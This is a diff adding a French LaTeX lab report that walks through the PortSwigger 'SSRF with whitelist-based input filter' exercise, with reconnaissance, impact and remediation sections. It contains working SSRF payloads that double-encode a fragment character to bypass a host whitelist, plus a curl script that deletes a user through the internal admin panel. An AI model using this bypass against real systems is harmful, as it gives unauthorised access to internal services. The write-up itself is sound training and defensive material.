@@ -1,0 +1,225 @@
+% =====================================================================
+%  Rapport de sécurité - SSRF with whitelist-based input filter
+%  Compilation : latexmk -pdf ssrf-whitelist-filter-bypass.tex
+% =====================================================================
+\documentclass[11pt,a4paper]{article}
+\input{../../templates/preambule.tex}
+
+\begin{document}
+
+\makecover
+  {SSRF with whitelist-based input filter}
+  {CWE-918 \textperiodcentered{} OWASP A10\string:2021}
+  {
+    \metarow{Lab}{SSRF with whitelist-based input filter}
+    \metarow{Classe}{Server-Side Request Forgery}
+    \metarow{Difficulté}{Expert}
+    \metarow{Cible}{Service interne de vérification de stock (HTTP)}
+    \metarow{Plateforme}{PortSwigger Web Security Academy}
+  }
+  {Lucas Fagioli}
+  {1er juillet 2026}
+
+% =====================================================================
+\section{Contexte}
+% =====================================================================
+La boutique expose une fonction "Check stock" sur chaque page produit.
+Au clic, le serveur récupère une URL passée dans le paramètre \texttt{stockApi}
+et renvoie le corps de cette réponse. C'est un point d'entrée SSRF d'école : le
+client contrôle, au moins en partie, l'URL que le serveur va requêter.
+
+L'application se défend par une liste blanche sur l'hôte : seul
+\texttt{stock.weliketoshop.net} est accepté, si bien qu'un naïf
+\texttt{http://localhost/admin} est rejeté. Tout l'enjeu est de faire tout de
+même atteindre l'interface d'administration interne, en exploitant une
+\textbf{incohérence entre l'analyseur d'URL qui valide l'hôte et l'analyseur
+d'URL qui exécute réellement la requête}.
+
+\begin{itemize}
+  \item \textbf{Point d'injection} : le paramètre POST \texttt{stockApi} sur \texttt{/product/stock}.
+  \item \textbf{Objectif} : atteindre \texttt{http://localhost/admin} et supprimer l'utilisateur \texttt{carlos}.
+\end{itemize}
+
+\subsection{Environnement}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{@{}p{0.30\textwidth}p{0.62\textwidth}@{}}
+  \textbf{Système}        & Windows 11 \\
+  \textbf{Outil principal}& Burp Suite Community Edition \\
+  \textbf{Navigateur}     & Chromium intégré à Burp (Open Browser) \\
+  \textbf{Cible}          & Instance de lab PortSwigger, \texttt{*.web-security-academy.net} \\
+\end{tabular}
+
+\shot{01-lab-not-solved.png}{État initial du lab, non résolu.}
+
+% =====================================================================
+\section{Reconnaissance}
+% =====================================================================
+Ouvrir n'importe quelle page produit révèle un sélecteur de magasin suivi d'un
+bouton \emph{Check stock}. C'est ce bouton qui déclenche la requête côté
+serveur.
+
+\shot{02-check-stock-feature.png}{Fonction "Check stock" sur une page produit.}
+
+Avec l'interception activée, cliquer sur \emph{Check stock} capture un POST
+vers \texttt{/product/stock} portant un paramètre \texttt{stockApi} encodé.
+
+\shot{03-intercepted-request-proxy.png}{Requête interceptée dans le proxy Burp.}
+
+La requête est envoyée au \emph{Repeater} pour itérer rapidement. Décodé, le
+paramètre pointe vers un service interne :
+
+\begin{lstlisting}
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=4&storeId=1
+\end{lstlisting}
+
+Une requête normale renvoie \texttt{200 OK} avec le nombre en stock comme corps
+(par exemple \texttt{677}). C'est notre référence.
+
+\shot{04-stockapi-request-repeater.png}{Requête \texttt{stockApi} de référence dans le Repeater.}
+
+% =====================================================================
+\section{Exploitation}
+% =====================================================================
+La stratégie est de construire le contournement observation par observation :
+confirmer le filtre, trouver une propriété que l'analyseur tolère, puis
+transformer cette propriété en confusion d'hôte.
+
+\subsection{Le filtre d'hôte bloque les cibles arbitraires}
+Pointer \texttt{stockApi} directement sur l'adresse de bouclage est rejeté, ce
+qui confirme une liste blanche d'hôtes plutôt qu'une liste noire :
+
+\begin{lstlisting}
+stockApi=http://127.0.0.1/
+\end{lstlisting}
+
+La réponse est une erreur indiquant que l'hôte de vérification de stock externe
+n'est pas autorisé.
+
+\shot{05-localhost-blocked.png}{Adresse de bouclage bloquée par la liste blanche.}
+
+\subsection{Les identifiants intégrés sont acceptés}
+Les URL de la forme \texttt{userinfo@hôte} sont valides, et l'analyseur lit
+l'hôte comme la partie après le \texttt{@}. Comme cette partie est le domaine
+autorisé, la requête est acceptée :
+
+\begin{lstlisting}
+stockApi=http://username@stock.weliketoshop.net/
+\end{lstlisting}
+
+La réponse revient normalement. La portion \texttt{username} est ignorée par le
+filtre, qui ne se soucie que de voir l'hôte \texttt{stock.weliketoshop.net}.
+
+\shot{06-embedded-credentials-accepted.png}{Identifiants intégrés acceptés par le filtre.}
+
+\subsection{Un caractère de fragment brut casse l'hôte}
+Ajouter un \texttt{\#} après les identifiants change la façon dont l'hôte est
+calculé : le \texttt{\#} démarre un fragment d'URL, si bien que l'analyseur ne
+voit plus \texttt{stock.weliketoshop.net} comme l'hôte, et la requête est
+rejetée :
+
+\begin{lstlisting}
+stockApi=http://username#@stock.weliketoshop.net/
+\end{lstlisting}
+
+\shot{07-hash-rejected.png}{Caractère \texttt{\#} brut rejeté.}
+
+C'est l'observation clé. Si l'on pouvait garder le \texttt{\#} invisible au
+validateur mais décodé par le composant qui exécute la requête, les deux
+analyseurs seraient en désaccord sur l'hôte.
+
+\subsection{Double-encoder le fragment pour désynchroniser les analyseurs}
+Encoder le \texttt{\#} deux fois (\texttt{\#} -> \texttt{\%23}
+-> \texttt{\%2523}) réalise exactement cela. Le serveur décode le
+paramètre une fois, donc :
+
+\begin{itemize}
+  \item le validateur voit \texttt{...localhost:80\%23@stock.weliketoshop.net...}. Le \texttt{\%23} est encore encodé, donc traité comme faisant partie des identifiants, et l'hôte est lu comme le \texttt{stock.weliketoshop.net} autorisé. La validation passe.
+  \item le client HTTP qui exécute la requête décode \texttt{\%23} en un vrai \texttt{\#}, si bien que l'autorité qui le précède (\texttt{localhost:80}) devient l'hôte cible réel.
+\end{itemize}
+
+Atteindre d'abord l'interface d'administration confirme que le contournement
+fonctionne :
+
+\begin{lstlisting}
+stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin
+\end{lstlisting}
+
+La réponse contient désormais le HTML du panneau d'administration interne, avec
+les liens de suppression d'utilisateurs.
+
+\shot{08-admin-panel-via-ssrf.png}{Panneau d'administration atteint via la SSRF.}
+
+\subsection{Résolution du lab}
+Pointer la même charge sur le point de suppression d'utilisateur supprime le
+compte cible :
+
+\begin{lstlisting}
+stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+\end{lstlisting}
+
+\shot{09-delete-carlos-request.png}{Requête supprimant \texttt{carlos} via la SSRF.}
+
+Le lab est marqué comme résolu.
+
+\shot{10-lab-solved.png}{Lab résolu.}
+
+La requête finale se reproduit en une seule commande \texttt{curl} :
+
+\begin{lstlisting}[language=bash]
+#!/usr/bin/env bash
+# Reproduit la requete SSRF finale du lab PortSwigger
+# "SSRF with whitelist-based input filter".
+#
+# La liste blanche n'autorise que l'hote stock.weliketoshop.net. Le fragment
+# double-encode (%2523 -> %23 -> #) desynchronise l'analyseur qui valide de
+# celui qui execute la requete : le serveur se connecte a localhost tandis que
+# le filtre croit encore voir l'hote autorise.
+#
+# Usage : ./exploit.sh <lab-id>.web-security-academy.net <cookie-session>
+set -euo pipefail
+HOST="${1:?usage: ./exploit.sh <lab-host> <session-cookie>}"
+SESSION="${2:?usage: ./exploit.sh <lab-host> <session-cookie>}"
+
+PAYLOAD='stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos'
+
+curl -sS "https://${HOST}/product/stock" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Cookie: session=${SESSION}" \
+  --data "${PAYLOAD}"
+\end{lstlisting}
+
+% =====================================================================
+\section{Impact}
+% =====================================================================
+La SSRF transforme le serveur en relais vers le réseau interne de confiance.
+Ici, elle a donné un accès non authentifié à une interface d'administration
+normalement joignable seulement depuis \texttt{localhost}, menant à la
+suppression d'un compte (impact d'intégrité et de disponibilité). Dans le monde
+réel, la même primitive sert couramment à atteindre les points de métadonnées
+cloud, des tableaux de bord internes et d'autres services back-end protégés
+uniquement par leur position réseau. L'attaque ne demande aucune
+authentification et se reproduit trivialement une fois la charge connue.
+
+Gravité indicative : \textbf{élevée}.
+
+% =====================================================================
+\section{Remédiation}
+% =====================================================================
+La cause racine est de faire confiance à une liste blanche d'hôtes appliquée
+avec un analyseur d'URL différent de celui utilisé pour effectuer la requête.
+Les bugs d'équivalence d'analyseurs rendent fragile toute liste blanche au
+niveau de la chaîne de caractères.
+
+\begin{itemize}
+  \item \textbf{Correctif principal} : analyser l'URL une seule fois avec un analyseur unique et strict, en extraire l'hôte, et rejeter tout ce qui ne correspond pas exactement à l'hôte autorisé. Réutiliser cette valeur analysée et normalisée pour construire la requête sortante, jamais la chaîne brute de l'utilisateur.
+  \item \textbf{Rejeter l'ambiguïté} : interdire les identifiants intégrés (\texttt{@}), les fragments et les caractères de contrôle encodés dans l'URL fournie, plutôt que d'essayer de les interpréter.
+  \item \textbf{Résoudre et épingler} : résoudre l'hôte en adresse IP et bloquer les plages privées, de bouclage et lien-local (dont l'IP de métadonnées cloud) avant de se connecter, pour se prémunir du DNS rebinding.
+  \item \textbf{Moindre privilège / segmentation} : l'interface d'administration interne ne devrait pas être joignable depuis le serveur applicatif, et devrait exiger une authentification même depuis \texttt{localhost}.
+  \item \textbf{Surveillance et journalisation} : journaliser les destinations des requêtes sortantes et alerter sur les requêtes vers des plages internes.
+\end{itemize}
+
+\vspace{4pt}
+\noindent\emph{Référence} : OWASP Server-Side Request Forgery Prevention Cheat
+Sheet ; CWE-918.
+
+\end{document}
